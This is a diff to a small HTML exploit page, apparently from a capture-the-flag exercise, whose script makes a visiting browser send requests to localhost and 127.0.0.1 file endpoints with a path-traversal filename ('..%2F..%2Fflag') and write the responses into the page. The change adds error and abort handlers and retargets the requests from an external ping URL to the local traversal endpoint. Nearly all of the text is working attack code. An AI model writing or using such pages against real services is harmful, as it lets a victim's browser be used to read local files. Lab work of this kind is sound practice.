@@ -1,7 +1,7 @@
 <html>
     <body>
 
-        ver 13
+        ver 14
 
  <div id="file1">kek</div>
  <div id="file2">kek</div>
@@ -12,9 +12,15 @@
             el1.innerHTML += this.responseText;
         }
 
+        function handleEvent(e) {
+              el1.innerHTML += e.status + " "+ e.type + ": " + e.loaded + " bytes transferred";
+        }
+
         var oReq = new XMLHttpRequest();
         oReq.addEventListener("load", reqListener);
-        oReq.open("GET", "https://ad-eu.p.otm-r.com/ping");
+        oReq.addEventListener("error", handleEvent);
+        oReq.addEventListener("abort", handleEvent);
+        oReq.open("GET", "http://localhost:8001/api/file?filename=..%2F..%2Fflag");
         oReq.send();
     </script> 
 
@@ -35,7 +41,7 @@
         oReq2.addEventListener("load", reqListener);
         oReq2.addEventListener("error", handleEvent);
         oReq2.addEventListener("abort", handleEvent);
-        oReq2.open("GET", "http://127.0.0.1/api/file?filename=..%2F..%2Fflag");
+        oReq2.open("GET", "http://localhost/api/file?filename=..%2F..%2Fflag");
         oReq2.send();
     </script>       
 
